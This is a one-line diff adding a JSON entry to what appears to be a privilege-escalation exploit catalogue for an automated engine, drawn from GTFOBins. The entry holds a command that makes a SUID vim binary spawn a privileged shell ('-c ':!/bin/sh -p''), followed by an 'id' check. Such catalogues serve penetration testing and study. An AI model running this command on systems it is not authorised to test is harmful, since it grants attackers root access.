@@ -1,0 +1,1 @@
+{"id":"suid_vim","category":"SUID_GTFOBINS","binary":"vim","cve":null,"exploitation":["{{binary}} -c ':!/bin/sh -p'"],"post_exploit":["id"],"notes":"Opens vim which drops to shell via :!. Interactive — exploit engine must handle in-editor prompt.","source":"gtfobins.github.io","tags":["suid","gtfobins","interactive"],"severity":"high"}
